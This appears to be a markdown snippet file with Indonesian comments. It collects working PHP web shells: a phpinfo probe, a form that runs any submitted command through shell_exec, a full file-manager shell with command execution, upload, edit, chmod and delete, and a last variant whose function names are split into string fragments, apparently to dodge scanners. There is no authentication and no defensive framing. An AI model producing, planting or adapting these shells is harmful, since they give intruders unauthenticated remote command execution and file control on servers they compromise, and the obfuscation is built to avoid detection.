# Execute CMD Command 
1. Menampilkan informasi PHP
    ```
        <?php
        // Menampilkan informasi PHP
        phpinfo();
        ?>
    ```

2. Execute CMD Command
   ```
           <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>CMD Executor</title>
        </head>
        <body>
            <h1>Execute CMD Command</h1>
            <form method="post">
                <input type="text" name="command" placeholder="Enter command" required>
                <button type="submit">Execute</button>
            </form>
        </body>
        </html>
        
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            // Ambil perintah dari input
            $command = $_POST['command'];
        
            // Jalankan perintah dan simpan output
            $output = shell_exec($command);
        
            // Tampilkan output
            echo "<pre>$output</pre>";
        }
        ?>
   ```

3. File Manager
    ```
        <?php
        $currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd(); // mulai dari current folder
        $fullPath = realpath($currentDir);
        
        // Cek apakah path valid
        if (!$fullPath || !is_dir($fullPath)) {
            die("Directory not found.");
        }
        
        // CMD output
        $cmdOutput = '';
        if (isset($_POST['run_cmd']) && isset($_POST['cmd'])) {
            $command = $_POST['cmd'];
            $cmdOutput = shell_exec("cd " . escapeshellarg($fullPath) . " && " . $command . " 2>&1");
        }
        
        // Handle form actions
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            if (isset($_POST['create'])) {
                file_put_contents($fullPath . '/' . $_POST['filename'], $_POST['content']);
            } elseif (isset($_POST['upload'])) {
                move_uploaded_file($_FILES['file']['tmp_name'], $fullPath . '/' . basename($_FILES['file']['name']));
            } elseif (isset($_POST['edit'])) {
                file_put_contents($fullPath . '/' . $_POST['filename'], $_POST['content']);
            } elseif (isset($_POST['rename'])) {
                rename($fullPath . '/' . $_POST['old_name'], $fullPath . '/' . $_POST['new_name']);
            } elseif (isset($_POST['chmod'])) {
                chmod($fullPath . '/' . $_POST['target'], octdec($_POST['permission']));
            }
        }
        
        if (isset($_GET['delete'])) {
            $target = $fullPath . '/' . $_GET['delete'];
            if (is_file($target)) unlink($target);
            elseif (is_dir($target)) rmdir($target);
        }
        
        $files = scandir($fullPath);
        $fileContent = '';
        $fileToEdit = '';
        if (isset($_GET['open'])) {
            $target = $fullPath . '/' . $_GET['open'];
            if (is_file($target)) {
                $fileContent = htmlspecialchars(file_get_contents($target));
                $fileToEdit = $_GET['open'];
            }
        }
        
        // Parent dir logic
        $parentDir = dirname($fullPath);
        ?>
        
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>File Manager (Full Access)</title>
            <style>
                body { font-family: sans-serif; padding: 20px; }
                textarea, pre { width: 100%; }
                textarea { height: 200px; }
                .cmd-box { background: #000; color: #0f0; padding: 10px; white-space: pre-wrap; margin-top: 10px; }
                ul { list-style-type: none; padding-left: 0; }
                li { margin: 5px 0; }
            </style>
        </head>
        <body>
        
        <h2>📁 File Manager</h2>
        <p>Current Directory: <strong><?php echo htmlspecialchars($fullPath); ?></strong></p>
        
        <form method="get">
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($parentDir); ?>">
            <button type="submit">⬆ Go to Parent Directory</button>
        </form>
        
        <!-- CMD -->
        <h3>Command Line</h3>
        <form method="post">
            <input type="text" name="cmd" placeholder="Enter command" style="width: 80%;" required>
            <button type="submit" name="run_cmd">Run</button>
        </form>
        <?php if ($cmdOutput): ?>
            <div class="cmd-box"><?php echo htmlspecialchars($cmdOutput); ?></div>
        <?php endif; ?>
        
        <!-- Upload -->
        <h3>Upload File</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="upload">Upload</button>
        </form>
        
        <!-- File/Folder List -->
        <h3>Contents</h3>
        <ul>
            <?php foreach ($files as $file): ?>
                <?php if ($file !== '.' && $file !== '..'): ?>
                    <?php
                    $path = $fullPath . '/' . $file;
                    $isDir = is_dir($path);
                    ?>
                    <li>
                        <strong><?php echo htmlspecialchars($file); ?></strong>
                        <?php if ($isDir): ?>
                            <a href="?dir=<?php echo urlencode($path); ?>">[Open]</a>
                        <?php else: ?>
                            <a href="?dir=<?php echo urlencode($fullPath); ?>&open=<?php echo urlencode($file); ?>">[View]</a>
                            <a href="?dir=<?php echo urlencode($fullPath); ?>&open=<?php echo urlencode($file); ?>&edit=true">[Edit]</a>
                        <?php endif; ?>
                        <a href="?dir=<?php echo urlencode($fullPath); ?>&delete=<?php echo urlencode($file); ?>" onclick="return confirm('Delete this?')">[Delete]</a>
                        <a href="?dir=<?php echo urlencode($fullPath); ?>&rename=<?php echo urlencode($file); ?>">[Rename]</a>
                    </li>
                <?php endif; ?>
            <?php endforeach; ?>
        </ul>
        
        <!-- Create File -->
        <h3>Create New File</h3>
        <form method="post">
            <input type="text" name="filename" required placeholder="Filename">
            <textarea name="content" required placeholder="Content..."></textarea>
            <button type="submit" name="create">Create</button>
        </form>
        
        <!-- Edit -->
        <?php if ($fileContent): ?>
            <h3>Edit File: <?php echo htmlspecialchars($fileToEdit); ?></h3>
            <form method="post">
                <input type="hidden" name="filename" value="<?php echo htmlspecialchars($fileToEdit); ?>">
                <textarea name="content"><?php echo $fileContent; ?></textarea>
                <button type="submit" name="edit">Save</button>
            </form>
        <?php endif; ?>
        
        <!-- Rename -->
        <?php if (isset($_GET['rename'])): ?>
            <h3>Rename: <?php echo htmlspecialchars($_GET['rename']); ?></h3>
            <form method="post">
                <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($_GET['rename']); ?>">
                <input type="text" name="new_name" required>
                <button type="submit" name="rename">Rename</button>
            </form>
        <?php endif; ?>
        
        <h4>🧠 CMD Cheatsheet (Linux)</h4>
        <table border="1" cellpadding="8" cellspacing="0" style="border-collapse: collapse; width: 100%;">
            <thead style="background-color:#f0f0f0;">
                <tr>
                    <th>Command</th>
                    <th>Description</th>
                </tr>
            </thead>
            <tbody>
                <tr><td><code>ls</code></td><td>List files and folders</td></tr>
                <tr><td><code>ls -la</code></td><td>List with permissions and hidden files</td></tr>
                <tr><td><code>pwd</code></td><td>Print current directory</td></tr>
                <tr><td><code>cd folder</code></td><td>Change directory</td></tr>
                <tr><td><code>cat file.txt</code></td><td>Show contents of a file</td></tr>
                <tr><td><code>nano file.txt</code></td><td>Edit file in terminal (if installed)</td></tr>
                <tr><td><code>touch file.txt</code></td><td>Create empty file</td></tr>
                <tr><td><code>mkdir newdir</code></td><td>Create new folder</td></tr>
                <tr><td><code>rm file.txt</code></td><td>Delete file</td></tr>
                <tr><td><code>rmdir folder</code></td><td>Remove empty folder</td></tr>
                <tr><td><code>rm -rf folder</code></td><td>Force delete folder and contents</td></tr>
                <tr><td><code>chmod 755 file</code></td><td>Change file permission</td></tr>
                <tr><td><code>whoami</code></td><td>Show current user</td></tr>
                <tr><td><code>top</code></td><td>Show running processes</td></tr>
                <tr><td><code>clear</code></td><td>Clear the terminal</td></tr>
            </tbody>
        </table>        
        </body>
        </html>

    ```
3. CMD
```        
    <?php
    // Inisialisasi fungsi-fungsi dengan metode dinamis
    $f1 = 'sh' . 'ell_' . 'exec';
    $f2 = 'fi' . 'le_' . 'put_' . 'contents';
    $f3 = 'mov' . 'e_' . 'upload' . '_file';
    $f4 = 'ren' . 'ame';
    $f5 = 'sca' . 'ndir';
    $f6 = 'htm' . 'lspe' . 'cial' . 'chars';
    $f7 = 'dir' . 'name';
    $f8 = 'url' . 'encode';
    $f9 = 'get' . 'cwd';
    $f10 = 'real' . 'path';
    $f11 = 'esc' . 'apeshe' . 'llarg';
    $f12 = 'is_' . 'dir';
    $f13 = 'base' . 'name';
    $f14 = 'un' . 'link';
    $f15 = 'fi' . 'le_get_' . 'contents';
    $f16 = 'is_' . 'file';
    $f17 = 'rm' . 'dir';
    
    // Current directory
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : $f9(); // getcwd
    $fullPath = $f10($currentDir); // realpath
    
    if (!$fullPath || !$f12($fullPath)) {
        die("Directory not found.");
    }
    
    // CMD output
    $cmdOutput = '';
    if (isset($_POST['run_cmd']) && isset($_POST['cmd'])) {
        $command = $_POST['cmd'];
        $cmd = "cd " . $f11($fullPath) . " && " . $command . " 2>&1";
        $cmdOutput = $f1($cmd);
    }
    
    // Handle form actions
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['create'])) {
            $f2($fullPath . '/' . $_POST['filename'], $_POST['content']);
        } elseif (isset($_POST['upload'])) {
            $f3($_FILES['file']['tmp_name'], $fullPath . '/' . $f13($_FILES['file']['name']));
        } elseif (isset($_POST['edit'])) {
            $f2($fullPath . '/' . $_POST['filename'], $_POST['content']);
        } elseif (isset($_POST['rename'])) {
            $f4($fullPath . '/' . $_POST['old_name'], $fullPath . '/' . $_POST['new_name']);
        }
    }
    
    // Delete logic
    if (isset($_GET['delete'])) {
        $target = $fullPath . '/' . $_GET['delete'];
        if ($f16($target)) $f14($target);
        elseif ($f12($target)) $f17($target);
    }
    
    // Scan directory
    $files = $f5($fullPath);
    $fileContent = '';
    $fileToEdit = '';
    if (isset($_GET['open'])) {
        $target = $fullPath . '/' . $_GET['open'];
        if ($f16($target)) {
            $fileContent = $f6($f15($target));
            $fileToEdit = $_GET['open'];
        }
    }
    
    // Parent dir logic
    $parentDir = $f7($fullPath);
    ?>
    
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>File Manager (Obfuscated)</title>
        <style>
            body { font-family: sans-serif; padding: 20px; }
            textarea, pre { width: 100%; }
            textarea { height: 200px; }
            .cmd-box { background: #000; color: #0f0; padding: 10px; white-space: pre-wrap; margin-top: 10px; }
            ul { list-style-type: none; padding-left: 0; }
            li { margin: 5px 0; }
        </style>
    </head>
    <body>
    
    <h2>📁 File Manager</h2>
    <p>Current Directory: <strong><?php echo $f6($fullPath); ?></strong></p>
    
    <form method="get">
        <input type="hidden" name="dir" value="<?php echo $f6($parentDir); ?>">
        <button type="submit">⬆ Go to Parent Directory</button>
    </form>
    
    <!-- CMD -->
    <h3>Command Line</h3>
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command" style="width: 80%;" required>
        <button type="submit" name="run_cmd">Run</button>
    </form>
    <?php if ($cmdOutput): ?>
        <div class="cmd-box"><?php echo $f6($cmdOutput); ?></div>
    <?php endif; ?>
    
    <!-- Upload -->
    <h3>Upload File</h3>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit" name="upload">Upload</button>
    </form>
    
    <!-- File/Folder List -->
    <h3>Contents</h3>
    <ul>
        <?php foreach ($files as $file): ?>
            <?php if ($file !== '.' && $file !== '..'): ?>
                <?php
                $path = $fullPath . '/' . $file;
                $isDir = $f12($path);
                ?>
                <li>
                    <strong><?php echo $f6($file); ?></strong>
                    <?php if ($isDir): ?>
                        <a href="?dir=<?php echo $f8($path); ?>">[Open]</a>
                    <?php else: ?>
                        <a href="?dir=<?php echo $f8($fullPath); ?>&open=<?php echo $f8($file); ?>">[View]</a>
                        <a href="?dir=<?php echo $f8($fullPath); ?>&open=<?php echo $f8($file); ?>&edit=true">[Edit]</a>
                    <?php endif; ?>
                    <a href="?dir=<?php echo $f8($fullPath); ?>&delete=<?php echo $f8($file); ?>" onclick="return confirm('Delete this?')">[Delete]</a>
                    <a href="?dir=<?php echo $f8($fullPath); ?>&rename=<?php echo $f8($file); ?>">[Rename]</a>
                </li>
            <?php endif; ?>
        <?php endforeach; ?>
    </ul>
    
    <!-- Create File -->
    <h3>Create New File</h3>
    <form method="post">
        <input type="text" name="filename" required placeholder="Filename">
        <textarea name="content" required placeholder="Content..."></textarea>
        <button type="submit" name="create">Create</button>
    </form>
    
    <!-- Edit -->
    <?php if ($fileContent): ?>
        <h3>Edit File: <?php echo $f6($fileToEdit); ?></h3>
        <form method="post">
            <input type="hidden" name="filename" value="<?php echo $f6($fileToEdit); ?>">
            <textarea name="content"><?php echo $fileContent; ?></textarea>
            <button type="submit" name="edit">Save</button>
        </form>
    <?php endif; ?>
    
    <!-- Rename -->
    <?php if (isset($_GET['rename'])): ?>
        <h3>Rename: <?php echo $f6($_GET['rename']); ?></h3>
        <form method="post">
            <input type="hidden" name="old_name" value="<?php echo $f6($_GET['rename']); ?>">
            <input type="text" name="new_name" required>
            <button type="submit" name="rename">Rename</button>
        </form>
    <?php endif; ?>
    
    </body>
    </html>

```
